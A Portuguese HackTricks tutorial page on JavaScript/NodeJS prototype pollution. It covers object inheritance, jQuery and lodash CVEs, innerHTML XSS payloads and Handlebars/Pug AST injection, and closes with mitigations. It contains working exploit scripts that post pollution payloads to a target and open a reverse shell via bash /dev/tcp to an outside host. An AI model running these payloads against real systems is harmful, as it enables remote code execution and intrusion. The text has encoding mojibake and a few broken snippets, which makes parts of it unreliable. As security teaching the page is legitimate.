# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Objetos em JavaScript <a href="#053a" id="053a"></a>

Primeiramente, precisamos entender `Object` em JavaScript. Um objeto √© simplesmente uma cole√ß√£o de pares de chave e valor, frequentemente chamados de propriedades desse objeto. Por exemplo:

![](<../../../.gitbook/assets/image (389) (1).png>)

Em Javascript, `Object` √© um objeto b√°sico, o modelo para todos os objetos rec√©m-criados. √â poss√≠vel criar um objeto vazio passando `null` para `Object.create`. No entanto, o objeto rec√©m-criado tamb√©m ter√° um tipo que corresponde ao par√¢metro passado e herda todas as propriedades b√°sicas.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Anteriormente aprendemos que um Objeto em javascript √© uma cole√ß√£o de chaves e valores, ent√£o faz sentido que um objeto `null` seja apenas um dicion√°rio vazio: `{}`

## Fun√ß√µes / Classes em Javascript <a href="#55dd" id="55dd"></a>

Em Javascript, os conceitos de classe e fun√ß√£o s√£o bastante inter-relacionados (a fun√ß√£o em si atua como o construtor para a classe e a natureza real n√£o tem conceito de "classe" em javascript). Vamos ver o exemplo a seguir:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## Prot√≥tipos em JavaScript <a href="#3843" id="3843"></a>

Uma coisa a se observar √© que o atributo prototype pode ser alterado/modificado/exclu√≠do ao executar o c√≥digo. Por exemplo, fun√ß√µes para a classe podem ser adicionadas dinamicamente:

![](<../../../.gitbook/assets/image (363).png>)

Fun√ß√µes da classe tamb√©m podem ser modificadas (como `toString` ou `valueOf` nos casos a seguir):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Heran√ßa

Em um programa baseado em prot√≥tipos, objetos herdam propriedades/m√©todos de classes. As classes s√£o derivadas adicionando propriedades/m√©todos a uma inst√¢ncia de outra classe ou adicionando-os a um objeto vazio.

Observe que, se voc√™ adicionar uma propriedade a um objeto que √© usado como prot√≥tipo para um conjunto de objetos (como o myPersonObj), os objetos para os quais ele √© o prot√≥tipo tamb√©m recebem a nova propriedade, mas essa propriedade n√£o √© impressa a menos que seja chamada especificamente.

![](<../../../.gitbook/assets/image (366).png>)

## Polui√ß√£o de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Voc√™ j√° deve ter aprendido que **cada objeto em JavaScript √© simplesmente uma cole√ß√£o de pares chave e valor** e que **cada objeto herda do tipo Object em JavaScript**. Isso significa que se voc√™ conseguir poluir o tipo Object **cada objeto JavaScript do ambiente ser√° polu√≠do!**

Isso √© bastante simples, voc√™ s√≥ precisa ser capaz de modificar algumas propriedades (pares chave-valor) de um objeto JavaScript arbitr√°rio, porque como cada objeto herda de Object, cada objeto pode acessar o esquema de Object.
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
A partir do exemplo anterior, √© poss√≠vel acessar a estrutura do Objeto usando os seguintes m√©todos:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Portanto, como mencionado anteriormente, se uma propriedade for adicionada ao esquema do Objeto, todos os objetos JavaScript ter√£o acesso √† nova propriedade:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Agora, cada objeto JS conter√° as novas propriedades: a fun√ß√£o `printHello` e a nova constante `globalconstant`

## polui√ß√£o de prot√≥tipo

Esta t√©cnica n√£o √© t√£o eficaz quanto a anterior, pois n√£o √© poss√≠vel poluir o esquema do Objeto JS. Mas em casos em que a **palavra-chave `__proto__` √© proibida, essa t√©cnica pode ser √∫til**.

Se voc√™ puder modificar as propriedades de uma fun√ß√£o, poder√° modificar a propriedade `prototype` da fun√ß√£o e **cada nova propriedade que voc√™ adicionar aqui ser√° herdada por cada objeto criado a partir dessa fun√ß√£o:**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
Neste caso, apenas os **objetos criados a partir da classe `person`** ser√£o afetados, mas cada um deles agora ir√° **herdar as propriedades `sayHello` e `newConstant`**.

**Existem 2 maneiras de abusar da polui√ß√£o de prot√≥tipos para contaminar TODOS os objetos JS.**

A primeira seria poluir a propriedade prototype do **Object** (como mencionado anteriormente, todos os objetos JS herdam desta):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Se voc√™ conseguir fazer isso, cada objeto JS ser√° capaz de executar a fun√ß√£o `sayBye`.

A outra maneira √© envenenar o prot√≥tipo de um construtor de uma vari√°vel de dicion√°rio como no exemplo a seguir:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Depois de executar esse c√≥digo, **cada objeto JS ser√° capaz de executar a fun√ß√£o `sayHey`**.

## Poluindo outros objetos

### De uma classe para Object.prototype

Em um cen√°rio onde voc√™ pode **poluir um objeto espec√≠fico** e precisa **chegar ao `Object.prototype`** voc√™ pode procur√°-lo com algo como o seguinte c√≥digo:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Polui√ß√£o de elementos de array

Observe que, assim como voc√™ pode poluir atributos de objetos em JS, se voc√™ tiver acesso para poluir um array, voc√™ tamb√©m pode **poluir os valores do array** acess√≠veis **por √≠ndices** (observe que voc√™ n√£o pode sobrescrever valores, ent√£o voc√™ precisa poluir √≠ndices que s√£o de alguma forma usados mas n√£o escritos).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Polui√ß√£o de elementos Html

Ao gerar um elemento HTML via JS, √© poss√≠vel **sobrescrever** o atributo **`innerHTML`** para fazer com que ele escreva **c√≥digo HTML arbitr√°rio**. [Idea and example from this writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemplos

### Exemplo B√°sico

Ent√£o, onde est√° a polui√ß√£o de prot√≥tipos? Isso acontece quando h√° um bug na aplica√ß√£o que torna poss√≠vel sobrescrever propriedades de `Object.prototype`. Como todo objeto t√≠pico herda suas propriedades de `Object.prototype`, podemos alterar o comportamento da aplica√ß√£o. O exemplo mais comumente mostrado √© o seguinte:
```javascript
if (user.isAdmin) {   // do something important!}
```
Imagine que temos uma polui√ß√£o de prot√≥tipo que torna poss√≠vel definir `Object.prototype.isAdmin = true`. Ent√£o, a menos que a aplica√ß√£o atribua explicitamente algum valor, `user.isAdmin` ser√° sempre verdadeiro!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

Por exemplo, `obj[a][b] = value`. Se o atacante puder controlar o valor de `a` e `value`, ent√£o ele s√≥ precisa ajustar o valor de `a` para `__proto__` (em JavaScript, `obj["__proto__"]` e `obj.__proto__` s√£o completamente equivalentes) ent√£o a propriedade `b` de todos os objetos existentes na aplica√ß√£o ser√° atribu√≠da a `value`.

No entanto, o ataque n√£o √© t√£o simples como o acima, de acordo com o [artigo](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf), s√≥ podemos atacar quando uma das seguintes tr√™s condi√ß√µes √© atendida:

* Realizar mesclagem recursiva
* Defini√ß√£o de propriedade por caminho
* Clonar objeto

### Sobrescrever fun√ß√£o
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Polui√ß√£o de Prot√≥tipo para RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Polui√ß√£o de Prot√≥tipo do Lado do Cliente para XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do jQuery $ .extend

$ .extend, se manipulado incorretamente, pode alterar as propriedades do objeto `prototype` (o modelo dos objetos no aplicativo). Este atributo ent√£o aparecer√° em todos os objetos. Note que apenas a vers√£o "profunda" (ou seja, g) do $ .extened √© afetada.

Os programadores frequentemente usam essa fun√ß√£o para duplicar um objeto ou preencher novas propriedades a partir de um objeto padr√£o. Por exemplo:

Podemos imaginar que `myObject` √© um campo de entrada do usu√°rio e √© serializado no banco de dados)

Neste c√≥digo, frequentemente pensamos que, ao ser executado, atribuir√° o atributo `isAdmin` ao objeto rec√©m-criado. Mas essencialmente, ele √© atribu√≠do diretamente a `{}` e ent√£o `{}.isAdmin` ser√° `true`. Se ap√≥s este c√≥digo, realizarmos a seguinte verifica√ß√£o:
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
Se o usu√°rio ainda n√£o existir (`undefined`), a propriedade `isAdmin` ser√° procurada em seu objeto pai, que √© o Objeto adicionado `isAdmin` com o valor `true` acima.

Outro exemplo ao ser executado no JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Esses erros podem afetar muitos projetos Javascript, especialmente projetos NodeJS, o exemplo mais pr√°tico √© o erro no Mongoose, a biblioteca JS que ajuda a manipular o MongoDB, em dezembro de 2018.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de polui√ß√£o de prot√≥tipos atrav√©s do lodash

[Lodash](https://www.npmjs.com/package/lodash) √© tamb√©m uma biblioteca bem conhecida que fornece muitas fun√ß√µes diferentes, nos ajudando a escrever c√≥digo de forma mais conveniente e organizada, com mais de 19 milh√µes de downloads semanais. E teve o mesmo problema que o JQuery.

**CVE-2018‚Äì3721**

**CVE-2019‚Äì10744**

Este bug afeta todas as vers√µes do Lodash, j√° corrigido na vers√£o 4.17.11.

### Outro tutorial com CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Polui√ß√£o de Prot√≥tipos AST no NodeJS

O NodeJS utiliza extensivamente √Årvores de Sintaxe Abstrata (AST) em JavaScript para funcionalidades como motores de template e TypeScript. Esta se√ß√£o explora as vulnerabilidades relacionadas √† polui√ß√£o de prot√≥tipos nos motores de template, especificamente Handlebars e Pug.

#### An√°lise de Vulnerabilidade do Handlebars

O motor de template Handlebars pode ser explorado para polui√ß√£o de prot√≥tipos. A vulnerabilidade est√° principalmente dentro das fun√ß√µes `appendContent` e `pushSource` no arquivo `javascript-compiler.js`, onde `appendContent` concatena `pendingContent` se existir, e `pushSource` define `pendingContent` como `undefined` ap√≥s empurrar o c√≥digo fonte.

##### Processo de Explora√ß√£o

A explora√ß√£o envolve a manipula√ß√£o do AST gerado pelo Handlebars. O processo √© o seguinte:

1. **Manipula√ß√£o do Parser**: O parser, atrav√©s do n√≥ `NumberLiteral`, for√ßa os valores a serem n√∫meros. No entanto, isso pode ser contornado pela polui√ß√£o de prot√≥tipos, permitindo a inser√ß√£o de strings n√£o num√©ricas.
2. **Manipula√ß√£o do Compilador**: O compilador aceita um Objeto AST ou uma string de template. Se `input.type` for `Program`, a entrada √© considerada pr√©-parseada, levando a uma poss√≠vel explora√ß√£o.
3. **Inje√ß√£o de C√≥digo**: Ao manipular `Object.prototype`, c√≥digo arbitr√°rio pode ser injetado na fun√ß√£o de template, levando a uma poss√≠vel execu√ß√£o remota de c√≥digo.

Exemplo de explora√ß√£o da vulnerabilidade do Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
O c√≥digo acima demonstra como um atacante pode injetar c√≥digo arbitr√°rio em um modelo Handlebars.

**Refer√™ncia Externa**: [Problema relacionado √† polui√ß√£o de prot√≥tipos na biblioteca 'flat'](https://github.com/hughsk/flat/issues/105)

Exemplo de polui√ß√£o de prot√≥tipos em Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vulnerabilidade do Pug

Assim como o Handlebars, o Pug tamb√©m pode ser explorado atrav√©s da polui√ß√£o de prot√≥tipos. Mais informa√ß√µes podem ser encontradas em [Inje√ß√£o de AST no Pug](https://blog.p6.is/AST-Injection/#Pug).

Exemplo de polui√ß√£o de prot√≥tipos no Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Medidas Preventivas

Para mitigar o risco de polui√ß√£o de prot√≥tipos, considere as seguintes estrat√©gias:

1. **Imutabilidade de Objetos**: Utilize `Object.freeze` para tornar `Object.prototype` imut√°vel.
2. **Valida√ß√£o de Entrada**: Valide estritamente as entradas JSON com base no esquema da aplica√ß√£o.
3. **Fun√ß√µes de Mesclagem Seguras**: Evite o uso inseguro de fun√ß√µes de mesclagem recursiva.
4. **Objetos sem Prot√≥tipo**: Use `Object.create(null)` para criar objetos sem propriedades de prot√≥tipo.
5. **Uso de Mapa**: Opte por `Map` em vez de `Object` para pares chave-valor.
6. **Atualiza√ß√µes de Biblioteca**: Atualize regularmente as bibliotecas para incorporar patches de seguran√ßa.



## Refer√™ncias

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
